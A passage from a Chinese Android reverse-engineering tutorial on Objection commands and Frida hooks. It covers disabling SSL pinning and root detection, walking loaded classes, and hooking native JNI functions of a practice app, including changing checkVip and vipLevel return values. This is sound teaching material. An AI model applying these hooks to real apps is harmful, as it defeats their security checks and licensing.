/system/lib64/libbinder.so</span><br><span class="line">libcutils.so                                                      0x72de269000  86016 (84.0 KiB)     /system/lib64/libcutils.so</span><br><span class="line">libhidlbase.so                                                    0x72df4cc000  692224 (676.0 KiB)   /system/lib64/libhidlbase.so</span><br><span class="line">liblog.so                                                         0x72e0be1000  98304 (96.0 KiB)     /system/lib64/liblog</span><br></pre></td></tr></table></figure><p>memory list exports so名称 - 查看库的导出函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">memory list exports liblog.so</span><br><span class="line">Save the output by adding `--json exports.json` to this <span class="built_in">command</span></span><br><span class="line">Type      Name                                  Address</span><br><span class="line">--------  ------------------------------------  ------------</span><br><span class="line"><span class="keyword">function</span>  android_log_write_int32               0x72e0be77c8</span><br><span class="line"><span class="keyword">function</span>  android_log_write_list_begin          0x72e0be76f0</span><br><span class="line"><span class="keyword">function</span>  __android_log_bswrite                 0x72e0be9bd8</span><br><span class="line"><span class="keyword">function</span>  __android_log_security                0x72e0bf2144</span><br><span class="line"><span class="keyword">function</span>  __android_log_bwrite                  0x72e0be9a18</span><br><span class="line"><span class="keyword">function</span>  android_log_reset                     0x72e0be75ec</span><br><span class="line"><span class="keyword">function</span>  android_log_write_string8             0x72e0be7a38</span><br><span class="line"><span class="keyword">function</span>  android_logger_list_free              0x72e0be8c04</span><br><span class="line"><span class="keyword">function</span>  __android_log_print                   0x72e0be9728</span><br><span class="line"><span class="keyword">function</span>  __android_logger_property_get_bool    0x72e0bf2248</span><br><span class="line"><span class="keyword">function</span>  android_logger_get_id                 0x72e0be8270</span><br><span class="line"><span class="keyword">function</span>  android_logger_set_prune_list         0x72e0be8948</span><br></pre></td></tr></table></figure><p>android hooking list activities -查看内存中加载的activity  &#x2F;android hooking list services -查看内存中加载的services</p><p>android intent launch_activity 类名 -启动<code>activity</code>或<code>service</code>(可以用于一些没有验证的activity,在一些简单的ctf中有时候可以出奇效)</p><p>关闭ssl校验 android sslpinning disable</p><p>关闭root检测 android root disable</p><h3 id="内存漫游"><a href="#内存漫游" class="headerlink" title="内存漫游"></a>内存漫游</h3><p>内存搜刮类实例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">android heap search instances 类名(命令)</span><br><span class="line">Class instance enumeration complete <span class="keyword">for</span> com.zj.wuaipojie.Demo  </span><br><span class="line"> Hashcode  Class                  toString()</span><br><span class="line">---------  ---------------------  -----------------------------</span><br><span class="line">215120583  com.zj.wuaipojie.Demo  com.zj.wuaipojie.Demo@cd27ac7</span><br></pre></td></tr></table></figure><p>调用实例方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">android heap execute &lt;handle&gt; getPublicInt(实例的hashcode+方法名)</span><br><span class="line"><span class="comment"># 如果是带参数的方法，则需要进入编辑器环境  </span></span><br><span class="line">android heap evaluate &lt;handle&gt;  </span><br><span class="line">console.log(clazz.a(<span class="string">&quot;吾爱破解&quot;</span>));</span><br><span class="line"><span class="comment"># 按住esc+enter触发</span></span><br></pre></td></tr></table></figure><p>android hooking list classes -列出内存中所有的类(结果比静态分析的更准确)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">android hooking list classes </span><br><span class="line"></span><br><span class="line">tw.idv.palatis.xappdebug.MainApplication</span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain</span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain<span class="variable">$a</span></span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain<span class="variable">$b</span></span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain<span class="variable">$c</span></span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookMain<span class="variable">$d</span></span><br><span class="line">tw.idv.palatis.xappdebug.xposed.HookSelf</span><br><span class="line">u</span><br><span class="line">v</span><br><span class="line">void</span><br><span class="line">w</span><br><span class="line">xposed.dummy.XResourcesSuperClass</span><br><span class="line">xposed.dummy.XTypedArraySuperClass</span><br><span class="line"></span><br><span class="line">Found 10798 classes</span><br></pre></td></tr></table></figure><p>android hooking search classes 关键类名 -在内存中所有已加载的类中搜索包含特定关键词的类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes wuaipojie</span><br><span class="line">Note that Java classes are only loaded when they are used, so <span class="keyword">if</span> the expected class has not been found, it might not have been loaded yet.</span><br><span class="line">com.zj.wuaipojie.Demo</span><br><span class="line">com.zj.wuaipojie.Demo<span class="variable">$Animal</span></span><br><span class="line">com.zj.wuaipojie.Demo<span class="variable">$Companion</span></span><br><span class="line">com.zj.wuaipojie.Demo<span class="variable">$InnerClass</span></span><br><span class="line">com.zj.wuaipojie.Demo$<span class="built_in">test</span><span class="variable">$1</span></span><br><span class="line">com.zj.wuaipojie.MainApplication</span><br><span class="line">com.zj.wuaipojie.databinding.ActivityMainBinding</span><br><span class="line">... </span><br><span class="line"></span><br><span class="line">Found 38 classes</span><br></pre></td></tr></table></figure><p>android hooking search methods 关键方法名 -在内存中所有已加载的类的方法中搜索包含特定关键词的方法(一般不建议使用，特别耗时，还可能崩溃)</p><p>android hooking list class_methods 类名 -内存漫游类中的所有方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">android hooking list class_methods com.zj.wuaipojie.ui.ChallengeSixth</span><br><span class="line">private static final void com.zj.wuaipojie.ui.ChallengeSixth.onCreate<span class="variable">$lambda</span>-0(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">private static final void com.zj.wuaipojie.ui.ChallengeSixth.onCreate<span class="variable">$lambda</span>-1(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">private static final void com.zj.wuaipojie.ui.ChallengeSixth.onCreate<span class="variable">$lambda</span>-2(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">private static final void com.zj.wuaipojie.ui.ChallengeSixth.onCreate<span class="variable">$lambda</span>-3(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">protected void com.zj.wuaipojie.ui.ChallengeSixth.onCreate(android.os.Bundle)</span><br><span class="line">public final java.lang.String com.zj.wuaipojie.ui.ChallengeSixth.hexToString(java.lang.String)</span><br><span class="line">public final java.lang.String com.zj.wuaipojie.ui.ChallengeSixth.unicodeToString(java.lang.String)</span><br><span class="line">public final void com.zj.wuaipojie.ui.ChallengeSixth.toastPrint(java.lang.String)</span><br><span class="line">public static void com.zj.wuaipojie.ui.ChallengeSixth.$r8$lambda<span class="variable">$1lrkrgiCEFWXZDHzLRibYURG1h8</span>(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">public static void com.zj.wuaipojie.ui.ChallengeSixth.$r8$lambda<span class="variable">$IUqwMqbTKaOGiTaeOmvy_GjNBso</span>(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">public static void com.zj.wuaipojie.ui.ChallengeSixth.$r8$lambda<span class="variable">$Kc_cRYZjjhjsTl6GYNHbgD</span>-i6sE(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line">public static void com.zj.wuaipojie.ui.ChallengeSixth.$r8$lambda<span class="variable">$PDKm2AfziZQo6Lv1HEFkJWkUsoE</span>(com.zj.wuaipojie.ui.ChallengeSixth,android.view.View)</span><br><span class="line"></span><br><span class="line">Found 12 method(s)</span><br></pre></td></tr></table></figure><h3 id="ObjectionHook"><a href="#ObjectionHook" class="headerlink" title="ObjectionHook"></a>ObjectionHook</h3><p>hook类的所有方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class 类名</span><br></pre></td></tr></table></figure><p>hook方法的参数、返回值和调用栈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method 类名.方法名 --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p>hook 类的构造方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method 类名.<span class="variable">$init</span></span><br></pre></td></tr></table></figure><p>hook 方法的所有重载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method 类名.方法名</span><br></pre></td></tr></table></figure><h2 id="Hook-Native"><a href="#Hook-Native" class="headerlink" title="Hook Native"></a>Hook Native</h2><p><code>Process</code> 对象代表当前被Hook的进程，能获取进程的信息，枚举模块，枚举范围等</p><table><thead><tr><th align="left">API</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>Process.id</code></td><td align="left">返回附加目标进程的 <code>PID</code></td></tr><tr><td align="left"><code>Process.isDebuggerAttached()</code></td><td align="left">检测当前是否对目标程序已经附加</td></tr><tr><td align="left"><code>Process.enumerateModules()</code></td><td align="left">枚举当前加载的模块，返回模块对象的数组</td></tr><tr><td align="left"><code>Process.enumerateThreads()</code></td><td align="left">枚举当前所有的线程，返回包含 <code>id</code>, <code>state</code>, <code>context</code> 等属性的对象数组</td></tr></tbody></table><p><code>Module</code> 对象代表一个加载到进程的模块(例如，在 Windows 上的 DLL，或在 Linux&#x2F;Android 上的 .so 文件),能查询模块的信息，如模块的基址、名称、导入&#x2F;导出的函数等</p><table><thead><tr><th align="left">API</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>Module.load()</code></td><td align="left">加载指定so文件，返回一个Module对象</td></tr><tr><td align="left"><code>enumerateImports()</code></td><td align="left">枚举所有Import库函数，返回Module数组对象</td></tr><tr><td align="left"><code>enumerateExports()</code></td><td align="left">枚举所有Export库函数，返回Module数组对象</td></tr><tr><td align="left"><code>enumerateSymbols()</code></td><td align="left">枚举所有Symbol库函数，返回Module数组对象</td></tr><tr><td align="left"><code>Module.findExportByName(exportName)、Module.getExportByName(exportName)</code></td><td align="left">寻找指定so中export库中的函数地址</td></tr><tr><td align="left"><code>Module.findBaseAddress(name)、Module.getBaseAddress(name)</code></td><td align="left">返回so的基地址</td></tr></tbody></table><p><code>Memory</code>是一个工具对象，提供直接读取和修改进程内存的功能，能够读取特定地址的值、写入数据、分配内存等</p><table><thead><tr><th align="left">方法</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left"><code>Memory.copy()</code></td><td align="left">复制内存</td></tr><tr><td align="left"><code>Memory.scan()</code></td><td align="left">搜索内存中特定模式的数据</td></tr><tr><td align="left"><code>Memory.scanSync()</code></td><td align="left">同上，但返回多个匹配的数据</td></tr><tr><td align="left"><code>Memory.alloc()</code></td><td align="left">在目标进程的堆上申请指定大小的内存，返回一个<code>NativePointer</code></td></tr><tr><td align="left"><code>Memory.writeByteArray()</code></td><td align="left">将字节数组写入一个指定内存</td></tr><tr><td align="left"><code>Memory.readByteArray</code></td><td align="left">读取内存</td></tr></tbody></table><h3 id="枚举导入导出表"><a href="#枚举导入导出表" class="headerlink" title="枚举导入导出表"></a>枚举导入导出表</h3><ol><li><strong>导出表（Export Table）</strong>：列出了库中可以被其他程序或库访问的所有公开函数和符号的名称。</li><li><strong>导入表（Import Table）</strong>：列出了库需要从其他库中调用的函数和符号的名称。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//打印导入表</span></span><br><span class="line">        <span class="keyword">var</span> imports = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>; i &lt; imports.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(imports[i].<span class="property">name</span> == <span class="string">&quot;vip&quot;</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(imports[i])); <span class="comment">//通过JSON.stringify打印object数据</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(imports[i].<span class="property">address</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//打印导出表</span></span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>; i &lt; <span class="built_in">exports</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>[i]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Native函数的基础Hook打印"><a href="#Native函数的基础Hook打印" class="headerlink" title="Native函数的基础Hook打印"></a>Native函数的基础Hook打印</h3><p>整数型、布尔值类型、char类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>,<span class="string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_checkVip&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr); </span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//Interceptor.attach是Frida里的一个拦截器</span></span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">                <span class="comment">//onEnter里可以打印和修改参数</span></span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args传入参数</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">0</span>]);  <span class="comment">//打印第一个参数的值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x1</span>);  <span class="comment">// 打印寄存器内容</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>].<span class="title function_">toInt32</span>()); <span class="comment">//toInt32()转十进制</span></span><br><span class="line">                                    <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">readCString</span>()); <span class="comment">//读取字符串 char类型</span></span><br><span class="line">                                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(args[<span class="number">2</span>])); <span class="comment">//内存dump</span></span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//onLeave里可以打印和修改返回值</span></span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval&quot;</span>,retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">        <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>,<span class="string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_vipLevel&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">                <span class="comment">//onEnter里可以打印和修改参数</span></span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args传入参数</span></span><br><span class="line">                    <span class="comment">// 方法一</span></span><br><span class="line">                    <span class="keyword">var</span> jString = <span class="title class_">Java</span>.<span class="title function_">cast</span>(args[<span class="number">2</span>], <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>));</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数:&quot;</span>, jString.<span class="title function_">toString</span>());</span><br><span class="line">                    <span class="comment">// 方法二</span></span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">JNIEnv</span> = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">                    <span class="keyword">var</span> originalStrPtr = <span class="title class_">JNIEnv</span>.<span class="title function_">getStringUtfChars</span>(args[<span class="number">2</span>], <span class="literal">null</span>).<span class="title function_">readCString</span>();        </span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数:&quot;</span>, originalStrPtr);                                </span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="comment">//onLeave里可以打印和修改返回值</span></span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                    <span class="keyword">var</span> returnedJString = <span class="title class_">Java</span>.<span class="title function_">cast</span>(retval, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>));</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;返回值:&quot;</span>, returnedJString.<span class="title function_">toString</span>());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Native函数的基础Hook修改"><a href="#Native函数的基础Hook修改" class="headerlink" title="Native函数的基础Hook修改"></a>Native函数的基础Hook修改</h3><p>整数型修改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>,<span class="string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_checkVip&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args参数</span></span><br><span class="line">                args[<span class="number">0</span>] = <span class="title function_">ptr</span>(<span class="number">1000</span>); <span class="comment">//第一个参数修改为整数 1000，先转为指针再赋值</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">20000</span>);  <span class="comment">//返回值修改</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval&quot;</span>,retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>字符串类型修改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//根据导出函数名打印地址</span></span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>,<span class="string">&quot;Java_com_zj_wuaipojie_util_SecurityUtil_vipLevel&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="comment">//onEnter里可以打印和修改参数</span></span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;  <span class="comment">//args传入参数</span></span><br><span class="line">                <span class="keyword">var</span> <span class="title class_">JNIEnv</span> = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">                <span class="keyword">var</span> originalStrPtr = <span class="title class_">JNIEnv</span>.<span class="title function_">getStringUtfChars</span>(args[<span class="number">2</span>], <span class="literal">null</span>).<span class="title function_">readCString</span>();        </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数:&quot;</span>, originalStrPtr);</span><br><span class="line">                <span class="keyword">var</span> modifiedContent = <span class="string">&quot;至尊&quot;</span>;</span><br><span class="line">                <span class="keyword">var</span> newJString = <span class="title class_">JNIEnv</span>.<span class="title function_">newStringUtf</span>(modifiedContent);</span><br><span class="line">                args[<span class="number">2</span>] = newJString;                                </span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//onLeave里可以打印和修改返回值</span></span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                <span class="keyword">var</span> returnedJString = <span class="title class_">Java</span>.<span class="title function_">cast</span>(retval, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>));</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;返回值:&quot;</span>, returnedJString.<span class="title function_">toString</span>());</span><br><span class="line">                <span class="keyword">var</span> <span class="title class_">JNIEnv</span> = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>();</span><br><span class="line">                <span class="keyword">var</span> modifiedContent = <span class="string">&quot;无敌&quot;</span>;</span><br><span class="line">                <span class="keyword">var</span> newJString = <span class="title class_">JNIEnv</span>.<span class="title function_">newStringUtf</span>(modifiedContent);</span><br><span class="line">                retval.<span class="title function_">replace</span>(newJString);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SO基址的获取方式"><a href="#SO基址的获取方式" class="headerlink" title="SO基址的获取方式"></a>SO基址的获取方式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> moduleAddr1 = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>).<span class="property">base</span>;  </span><br><span class="line"><span class="keyword">var</span> moduleAddr2 = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;lib52pojie.so&quot;</span>).<span class="property">base</span>;  </span><br><span class="line"><span class="keyword">var</span> moduleAddr3 = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Hook未导出函数与函数地址计算"><a href="#Hook未导出函数与函数地址计算" class="headerlink" title="Hook未导出函数与函数地址计算"></a>Hook未导出函数与函数地址计算</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 